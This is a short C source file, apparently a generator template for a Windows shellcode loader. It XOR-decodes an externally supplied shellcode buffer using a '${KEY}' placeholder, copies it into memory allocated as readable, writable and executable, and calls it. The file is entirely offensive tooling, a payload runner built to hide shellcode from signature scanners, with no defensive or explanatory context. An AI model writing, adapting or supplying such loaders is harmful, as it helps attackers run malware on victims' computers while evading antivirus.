#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include "Xor.h"
/*
Externally defined xorShellcode function:

{
    void xorShellcode(unsigned char *shellcode, unsigned int shellcode_size, unsigned char key);
}

*/

#include <windows.h>
int main( int argc, char * argv[] ) {
    void * exec = VirtualAlloc( 0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    xorShellcode( shellcode, shellcode_size, "${KEY}" );
    memcpy( exec, shellcode, shellcode_size );
    ( (void ( * )())exec )();
    return 0;
}